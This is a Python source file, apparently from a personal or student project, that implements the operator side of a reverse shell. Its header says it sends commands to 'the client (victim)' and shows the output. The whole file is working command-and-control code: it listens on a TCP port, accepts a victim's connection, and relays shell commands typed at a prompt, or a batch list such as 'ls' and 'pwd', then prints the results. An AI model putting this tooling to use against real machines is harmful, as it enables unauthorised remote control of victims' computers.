#!/usr/bin/env python
# -*-coding:utf-8 -*-
'''
@File    :   server.py
@Time    :   2021/06/02 19:09:40
@Author  :   Shanto Roy 
@Version :   1.0
@Contact :   sroy10@uh.edu
@Desc    :   Server Program that sends command to the client (victim) and shows output
'''


import socket

class Server:
    def __init__(self, host_ip, host_port):
        self.host_ip = host_ip
        self.host_port = host_port

    def start_conn(self):
        print("####################################")
        print("######### Server Program #########")
        print("####################################")

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((self.host_ip,self.host_port))

        print("Msg: Server Initiated...")
        print("Msg: Listening to the Client")

        server.listen(1)
        self.client, self.client_addr = server.accept()

        print("Msg: Received Connection from", self.client_addr)


    def online_interaction(self):
        while True:
            interface = '[+] '+ str(self.client_addr[0]) + " :sh$ "
            command = input(interface)
            print(command)
            self.client.send(command.encode())
            recv_data = self.client.recv(1024).decode()
            if recv_data == b"":
                continue
            print("\n", recv_data, "\n")

    
    def offline_interaction(self,list_of_commands):
        self.client.send(str(list_of_commands).encode())
        recv_data = self.client.recv(1024).decode()
        print("Received output data from Client\n\n")
        print(recv_data)


if __name__ == '__main__':
    server = Server('127.0.0.1', 4000)
    server.start_conn()
    server.online_interaction()
    # server.offline_interaction(["ls", "pwd"])